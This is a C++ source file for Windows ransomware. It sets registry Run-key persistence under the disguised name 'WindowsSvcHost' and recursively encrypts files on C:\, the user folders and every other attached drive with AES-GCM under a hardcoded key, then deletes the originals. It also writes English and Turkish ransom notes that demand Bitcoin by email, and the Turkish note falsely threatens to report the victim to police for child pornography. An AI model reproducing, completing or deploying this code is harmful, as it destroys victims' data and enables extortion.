#include <boost/config/warning_disable.hpp>
#include <boost/filesystem.hpp>
#include <iostream>
#include <iterator>
#include <stdio.h>
#include <windows.h>
#include <fstream>
#include <thread>
#include <vector>
#include <sstream>
#include <locale>
#include <strsafe.h>
#include <cryptlib.h>
#include <sha.h>
#include <secblock.h>
#include <files.h>
#include <queue.h>
#include <hex.h>
#include <filters.h>
#include <osrng.h>
#include <dh.h>
#include <modes.h>
#include <gcm.h>
#include <tea.h>
#include <aes.h>
#include <pssr.h>
#include <rsa.h>
#include <nbtheory.h>
#include <eccrypto.h>
#include <xts.h>
#include <oids.h>
#include <modes.h>
#include <string>
#include <shellapi.h>


using namespace std;
using namespace boost::filesystem;
#define STRSAFE_MAX_CCH     2147483647  
using namespace CryptoPP;

string app = getenv("APPDATA");
//app += "\\ransomnote.txt";
ofstream asdnote(app + "\\ransomnote.txt", ios::out);

//wofstream Cout_file("Cdata.txt", ios::out);
//wofstream Dout_file("Ddata.txt", ios::out);
//#pragma comment(lib,"libboost_filesystem-vc142-mt-gd-x32-1_79.lib")
#define MAX 256
/*string app = getenv("APPDATA");
app += "\\ransomnote.txt";
ofstream note("ransomnote.txt", ios::out);*/


int regEdit() {
	//const char* czStartName = "MyApplication";
	//wstring progPath = L"C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\MyApp.exe";

	char err[128] = "Failed\n";
	char suc[128] = "Created Persistence At: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";

	string appdata = getenv("APPDATA");
	appdata += "\\Windowssvchost.pif";

	wstring stemp = wstring(appdata.begin(), appdata.end());
	LPCWSTR to = stemp.c_str();

	//wcout << "STEMP: " << stemp << endl;

	if (CopyFile(L"program.pif", to, 0)) {
		cout << "basarili" << endl;
	}
	else {
		cout << "fail" << endl;
	}


	HKEY NewVal;

	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
		cout << err << endl;
		return -1;
	}
	if (RegSetValueEx(NewVal, L"WindowsSvcHost", 0, REG_SZ, (BYTE*)stemp.c_str(), (stemp.size() + 1) * sizeof(wchar_t)) != ERROR_SUCCESS) {
		RegCloseKey(NewVal);
		cout << err << endl;
		return -1;
	}
	RegCloseKey(NewVal);
	cout << suc << endl;
	return 0;

}

void decrypt_file(string efile, SecByteBlock key, SecByteBlock iv)  //keep hash
{
	string efilename = efile;
	efile.erase(efile.end() - 4, efile.end());
	string rfilename = efile;

	//SecByteBlock key(AES::MAX_KEYLENGTH);
	//byte iv[ AES::BLOCKSIZE ];



	GCM< AES >::Decryption d2;
	d2.SetKeyWithIV(key, key.size(), iv, sizeof(iv));

	FileSource fs2(efilename.c_str(), true,
		new AuthenticatedDecryptionFilter(d2,
			new FileSink(rfilename.c_str()),
			AuthenticatedDecryptionFilter::THROW_EXCEPTION));

}

void encrypt_file(string oFile, SecByteBlock key, SecByteBlock iv)
{
	// SecByteBlock key(AES::MAX_KEYLENGTH);
	// byte iv[ AES::BLOCKSIZE ];

	string ofilename = oFile;
	string outFile = oFile + ".cry";
	string efilename = outFile;

	string host = ofilename.substr(ofilename.length() - 18);
	string note = ofilename.substr(ofilename.length() - 14);

	if (host != "Windowssvchost.pif" || note != "ransomnote.txt") {

		std::ifstream ifile(oFile.c_str(), ios::binary);
		std::ifstream::pos_type size = ifile.seekg(0, std::ios_base::end).tellg();
		ifile.seekg(0, std::ios_base::beg);

		string temp;
		temp.resize(size);
		ifile.read((char*)temp.data(), temp.size());


		GCM< AES >::Encryption e1;
		e1.SetKeyWithIV(key, key.size(), iv, sizeof(iv));

		StringSource ss1(temp, true,
			new AuthenticatedEncryptionFilter(e1,
				new FileSink(efilename.c_str())));
	}
}

void CUser(SecByteBlock key, SecByteBlock iv) {
	boost::system::error_code dir_error;
	std::locale loc(std::locale("tr_TR.utf8"));
	std::locale::global(loc);

	// set console output
	SetConsoleOutputCP(CP_UTF8);
	SetConsoleCP(CP_UTF8);

	// set file
	
	//Cout_file.imbue(loc);
	wchar_t BOM = static_cast<wchar_t>(0xFEFF);
	//Cout_file.put(BOM);
	//file.put(test_char);
	std::size_t len = 0;
	try {
		for (boost::filesystem::recursive_directory_iterator end, dir("C:\\Users", dir_error); dir != end; dir.increment(dir_error)) {
			if (dir_error.value()) {
				cerr << "Error accessing file: " << dir_error.message() << endl;
			}
			else {



				const wchar_t* m = dir->path().wstring().c_str();
				cout << endl;
				if (FAILED(StringCchLengthW(m, STRSAFE_MAX_CCH, &len)))
				{
					std::wcout << L"Failed getting string length" << std::endl;

				}


				//Cout_file.write(m, len);
				//Cout_file << "\n";

				//wcout << m << endl;

				wstring wfilepath = dir->path().wstring().c_str();
				string FilePath = string(wfilepath.begin(), wfilepath.end());


				/*string last4 = FilePath.substr(FilePath.length() - 4);
				if (last4 == ".cry") {
					try {
						decrypt_file(FilePath, key, iv);
						cout << FilePath << endl;
						cout << "file decrypted" << endl;
					}
					catch (exception) {
						cout << "File can't be decrypted" << endl;
						continue;
					}
					try {
						char name[256];
						strcpy_s(name, 255, FilePath.c_str());
						remove(name);
					}
					catch (exception) {
						cout << "File can't be removed" << endl;
						continue;
					}
				}
				else
					continue;*/


				string last4 = FilePath.substr(FilePath.length() - 4);
				if (last4 != ".cry") {
					try {
						encrypt_file(FilePath,key,iv);
						cout << FilePath << endl;
						cout << "File encrypted ";
					}
					catch (exception) {
						continue;
					}
					try {
						string host = FilePath.substr(FilePath.length() - 18);
						if(host != "Windowssvchost.pif"){
						char chFile[256];
						strcpy_s(chFile, 255, FilePath.c_str());
						remove(chFile);
						//cout << "File removed" << endl;
						}
					}
					catch (exception) {
						continue;
					}
				}

			}
		}

	}
	catch (exception) {
	}
}

void Cdrive(SecByteBlock key, SecByteBlock iv) {
	boost::system::error_code dir_error;
	std::locale loc(std::locale("tr_TR.utf8"));
	std::locale::global(loc);

	// set console output
	SetConsoleOutputCP(CP_UTF8);
	SetConsoleCP(CP_UTF8);

	// set file

	//Cout_file.imbue(loc);
	wchar_t BOM = static_cast<wchar_t>(0xFEFF);
	//Cout_file.put(BOM);
	//file.put(test_char);
	std::size_t len = 0;
	try {
		for (boost::filesystem::recursive_directory_iterator end, dir("C:\\", dir_error); dir != end; dir.increment(dir_error)) {
			if (dir_error.value()) {
				cerr << "Error accessing file: " << dir_error.message() << endl;
			}
			else {


				
				const wchar_t* m = dir->path().wstring().c_str();
				cout << endl;
				if (FAILED(StringCchLengthW(m, STRSAFE_MAX_CCH, &len)))
				{
					std::wcout << L"Failed getting string length" << std::endl;

				}


				//Cout_file.write(m, len);
				//Cout_file << "\n";

				//wcout << m << endl;

				wstring wfilepath = dir->path().wstring().c_str();
				string FilePath = string(wfilepath.begin(), wfilepath.end());


				/*string last4 = FilePath.substr(FilePath.length() - 4);
				if (last4 == ".cry") {
					try {
						decrypt_file(FilePath, key, iv);
						cout << FilePath << endl;
						cout << "file decrypted" << endl;
					}
					catch (exception) {
						cout << "File can't be decrypted" << endl;
						continue;
					}
					try {
						char name[256];
						strcpy_s(name, 255, FilePath.c_str());
						remove(name);
					}
					catch (exception) {
						cout << "File can't be removed" << endl;
						continue;
					}
				}
				else
					continue;*/


				string last4 = FilePath.substr(FilePath.length() - 4);
				if (last4 != ".cry") {
					try {
						encrypt_file(FilePath, key, iv);
						cout << FilePath << endl;
						cout << "File encrypted ";
					}
					catch (exception) {
						continue;
					}
					try {
						string host = FilePath.substr(FilePath.length() - 18);
						if (host != "Windowssvchost.pif") {
							char chFile[256];
							strcpy_s(chFile, 255, FilePath.c_str());
							remove(chFile);
							//cout << "File removed" << endl;
						}
					}
					catch (exception) {
						continue;
					}
				}

			}
		}

	}
	catch (exception) {
	}
}

void AllDrive(string drive, SecByteBlock key, SecByteBlock iv) {
	boost::system::error_code dir_error;
	std::locale loc(std::locale("tr_TR.utf8"));
	std::locale::global(loc);

	// set console output
	SetConsoleOutputCP(CP_UTF8);
	SetConsoleCP(CP_UTF8);

	// set file

	//Cout_file.imbue(loc);
	wchar_t BOM = static_cast<wchar_t>(0xFEFF);
	//Cout_file.put(BOM);
	//file.put(test_char);
	std::size_t len = 0;
	try {
		for (boost::filesystem::recursive_directory_iterator end, dir(drive, dir_error); dir != end; dir.increment(dir_error)) {
			if (dir_error.value()) {
				cerr << "Error accessing file: " << dir_error.message() << endl;
			}
			else {



				const wchar_t* m = dir->path().wstring().c_str();
				cout << endl;
				if (FAILED(StringCchLengthW(m, STRSAFE_MAX_CCH, &len)))
				{
					std::wcout << L"Failed getting string length" << std::endl;

				}


				//Cout_file.write(m, len);
				//Cout_file << "\n";

				//wcout << m << endl;

				wstring wfilepath = dir->path().wstring().c_str();
				string FilePath = string(wfilepath.begin(), wfilepath.end());
				//cout << FilePath << endl;

				/*string last4 = FilePath.substr(FilePath.length() - 4);
				if (last4 == ".cry") {
					try {
						decrypt_file(FilePath,key,iv);
						cout << "file decrypted" << endl;
					}
					catch (exception) {
						continue;
					}
					try {
						char name[256];
						strcpy_s(name, 255, FilePath.c_str());
						remove(name);
					}
					catch (exception) {
						continue;
					}
				}
				else
					continue;*/


				string last4 = FilePath.substr(FilePath.length() - 4);
				if (last4 != ".cry") {
					try {
						encrypt_file(FilePath, key, iv);
						//cout << "File encrypted";
					}
					catch (exception) {
						continue;
					}
					try {
						char chFile[256];
						strcpy_s(chFile, 255, FilePath.c_str());
						remove(chFile);
						//cout << "File removed" << endl;
					}
					catch (exception) {
						continue;
					}
				}


			}
		}

	}
	catch (exception) {
	}
}
bool is_file_exist(const char* fileName)
{
	ifstream infile(fileName);
	if (infile) {
		cout << "bulundu" << endl;
		return 0;

	}
	else {
		cout << "yok" << endl;
		return 1;
	}

}


void MSGB(LPCWSTR content, LPCWSTR header) {
	MessageBox(0, content, header, MB_ICONWARNING);
}


void writeRansom() {
	

	string snote = "The harddisks of your computer have been encrypted with an Military grade encryption algorithm.\n"
		"There is no way to restore your data without a special key.\nOnly we can decrypt your files!\n\n\n"
		"To purchase your key and restore your data, please follow these three easy steps : \n\n1.Email your personal id to flayedskull@protonmail.com\n\n"
		"2.You will recieve your personal BTC address for payment.\n    Once payment has been completed, send another email to flayedskull@protonmail.com stating PAID.\n  "
		"We will check to see if payment has been paid.\n\n"
		"3. You will receive a text file with your KEY that will unlock all your files. \n\n "
		"AMK COCU ANA BACI KAYARKEN IYI AAHHAHAHA\n\n"
		"IMPORTANT: To decrypt your files, place text file on desktopand wait.Shortly after it will begin to decrypt all files.\n\n"
		"WARNING:\nDo NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlcok your files.\n"
		"Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files - "
		"-and there is a high chance you will lose your files forever.\nDo NOT send PAID button without paying, price WILL go up for disobedience.\n"
		"Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay.WE WILL.";

	string trNote = "Bilgisayarinizin harddiski AES 256 algoritmasi ile tamamen sifrelenmistir.\n"
		"Verilerinizi kurtarmanin hicbir yolu yoktur ancak bizim verecegimiz desifre ile kurtarabilirsiniz.\n"
		"SADECE BIZ KURTARABILIRIZ!\n\n\n" "Desifreyi satin almak icin ilerideki adimlari takip ediniz: \n\n"
		"1.flayedskull@protonmail.com'a BTC yazarak mail atiniz\n\n"
		"2.Sonrasinda parayi gondereceginiz bitcoin adresini size gonderecegiz.\n"
		"Parayi gonderdikten sonra, ayni mail adresi flayedskull@protonmail.com'a PAID yazarak mail atiniz.\n\n"
		"3. Para gelmis ise size desifreyi verecegiz ve verilerinize geri ulasacaksiniz. \n\n"
		"ONEMLI!!!!!!: EGER PARAYI GONDERMEYI REDDEDERSENIZ MAILINIZ TELFON NUMARANIZ BILGISAYARINIZDAKI VERILER VE COCUK PORNOGRAFISI ICEREN MESAJLARINIZ\n"
		"POLISE VERILECEK VE HAKKINIZDA HUKUKI ISLEMLER BASLATILACAKTIR.\n"
		"TCK(226/5) MADDESINE GORE COCUK PORNOGRAFISI BULUNDURDUGUNUZDAN DOLAYI 10 YILA KADAR HAPISTE YATACAKSINIZ\n\n"
		"DIKKAT:\nDESIFRE ICIN BASKA BIR YAZILIM KULLANMAK VERILERINIZE ERISIMINIZI TAMAMEN ENGELLEYEBILIR EGER VE BUNU YAPMANIN BEDELI OLARAK ODEYECEGINIZ PARA ARTACAKTIR.\n"
		"DOSYA ISIMLERINI DEGISTIRMEYIN, DOSYALAR ILE UGRASMAYIN, YOKSA BIR DAHA VERILERINIZE ERISEMEZSINIZ\n"
		"VE TAMAMEN BUTUN DOSYALARINIZI KAYBEDERSINIZ.\nEGER PARAYI ODEMEDIGINIZ HALDE PAID MAILINI GONDERIRSENIZ, ODEYECEGINIZ PARA ARTAR!!!!!.\n"
		"ODEMEDIGINIZ TAKDIRDE OLACAKLARI BILIYORSUNUZ EGER CEZAEVINE COK MERAKIN VARSA DEVAM ET!!!!!\n\n\n"
		"Bugunun tarihini baz alarak parayi 7 gun icerisinde yatirmalisiniz. Aksi takdirde bilgisayarinizdan calinan veriler ile birlikte polise verileceksiniz ve bilgisayarinizdaki her sey silinecektir\n"
		"ODEYECEGINIZ MIKTAR: 500 DOLAR.\n";
	
	asdnote << snote << endl;
	asdnote.close();

	char* appdata = getenv("APPDATA");
	//cout << "APP: " << appdata << endl;
	if (!SetCurrentDirectoryA(appdata)) {
		printf("SetCurrentDirectory failed (%d)\n", GetLastError());
	}
	else {
		//cout << "Director has been changed too ";
		//system("chdir");
	}
	//system("chdir");
	//system("pause");


	//string appdata = getenv("APPDATA");
	//appdata += "\\ransomnote.txt";

	//wstring stemp = wstring(appdata.begin(), appdata.end());
	//LPCWSTR to = stemp.c_str();

	//CopyFile(L"ransomnote.txt", to, 0);

	MSGB(L"BILGISAYARINIZ HACKLENMISTIR ACIKALMAYI OKUYUN", L"Windows");
	Sleep(10000);
	char chTxtFile[256];
	strcpy_s(chTxtFile, 255, app.c_str());
	system("ransomnote.txt");
	
	//asdnote.close();
	
}


void checkOpen() {
	Sleep(15000);
	char* appdata = getenv("APPDATA");
	//cout << "APP: " << appdata << endl;
	if (!SetCurrentDirectoryA(appdata)) {
		printf("SetCurrentDirectory failed (%d)\n", GetLastError());
	}
	else {
		//cout << "Director has been changed too ";
		system("chdir");
	}
	while (true) {
		//writeRansom();
		if (!asdnote.is_open()) {
			//cout << "ASD KAPALI AMK OCU" << endl;
			char chTxtFile[256];
			strcpy_s(chTxtFile, 255, app.c_str());
			system("ransomnote.txt");
			//MSGB(L"KAPATMA SIKERIM BELANI!", L"BERI BAK!!!");	
		}
		

	}
}
int main() {
	
	//ShowWindow(GetConsoleWindow(), SW_HIDE); //SW_RESTORE to bring back

	regEdit();
	
	/*string pass = "asddsa1234321";
	string input;
	cout << "Password:" << endl;
	cin >> input;

	if (input != pass)
		exit(1);*/
	char* appdata = getenv("APPDATA");
	//cout << "APP: " << appdata << endl;
	if (!SetCurrentDirectoryA(appdata)) {
		printf("SetCurrentDirectory failed (%d)\n", GetLastError());
	}
	else {
		//cout << "Director has been changed too ";
		//system("chdir");
	}
	//system("chdir");
	//system("pause");


	AutoSeededRandomPool prng;
	HexEncoder encoder(new FileSink(std::cout));


	//the password
	string sKey = "C80D6C76E06F012D2CBB638175212C84";
	string siv = "A996B89450D95494384AC0DE497EEC82";

	// Convert "UltraSecretKeyPhrase" to SecByteBlock
	SecByteBlock key((const unsigned char*)(sKey.data()), sKey.size());
	SecByteBlock iv((const unsigned char*)(siv.data()), siv.size());



	thread t1(Cdrive, key, iv);

	thread t2(CUser, key, iv);
	int i;

	UINT test;

	LPCWSTR drive2[13] = { L"A:\\", L"B:\\", L"D:\\", L"E:\\", L"F:\\", L"G:\\", L"H:\\",L"I:\\", L"J:\\", L"K:\\", L"L:\\" };
	string stdrive[13] = { "A:\\", "B:\\",  "D:\\", "E:\\", "F:\\", "G:\\", "H:\\","I:\\", "J:\\", "K:\\", "L:\\" };
	vector<string> arr;
	for (i = 0; i < 12; i++)
	{
		test = GetDriveType(drive2[i]);
		switch (test)
		{
		case 2: printf("Drive %S is type %d - Removable.\n", drive2[i], test);
			arr.push_back(stdrive[i]);
			break;

		case 3: printf("Drive %S is type %d - Fixed.\n", drive2[i], test);
			arr.push_back(stdrive[i]);
			break;

		case 5: printf("Drive %S is type %d - CD-ROM.\n", drive2[i], test);
			arr.push_back(stdrive[i]);
			break;

		case 6: printf("Drive %S is type %d - RAMDISK.\n", drive2[i], test);
			arr.push_back(stdrive[i]);
			break;
		default: "Unknown value!\n";
		}
	}
	t1.join();
	t2.join();


	thread ransom(writeRansom);

	//thread anan(hint);

	thread check(checkOpen);


	if (!arr.empty()) {
		for (const auto& e : arr) {
			std::cout << e << std::endl;
			AllDrive(e, key, iv);
		}
	}
	//cout << "NABER" << endl;
	system("pause");

}
